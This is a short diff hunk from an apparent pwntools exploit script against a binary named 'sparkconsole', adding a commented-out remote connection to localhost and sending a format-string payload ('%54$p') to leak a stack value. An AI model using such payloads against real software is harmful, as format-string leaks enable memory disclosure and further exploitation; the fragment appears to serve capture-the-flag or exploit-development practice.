@@ -3,6 +3,7 @@ context.arch = 'i386'
 
 binary = ELF('./sparkconsole')
 p = process(binary.path)
+# p = remote("localhost", 7910)
 
 p.recvuntil(b'$ ')
 p.sendline(b'echo %54$p')
